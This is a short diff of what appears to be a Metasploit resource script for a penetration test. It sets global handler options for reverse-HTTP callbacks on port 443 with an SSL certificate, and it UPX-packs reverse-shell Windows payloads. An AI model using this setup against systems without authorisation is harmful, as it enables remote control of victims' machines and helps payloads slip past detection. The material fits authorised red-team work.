@@ -2,7 +2,7 @@ jobs -K
 
 setg LPORT 443
 setg PayloadUUIDTracking true
-setg HandlerSSLCert /certs/cert.pem
+setg HandlerSSLCert /export/cert.pem
 setg StagerVerifySSLCert true
 setg IgnoreUnknownPayloads true
 setg LURI /multi
@@ -39,3 +39,4 @@ upx -9 /pentest/share/reverse.http.windows_i386.exe
 upx -9 /pentest/share/reverse.http.windows_i386.dll
 
 back
+backup
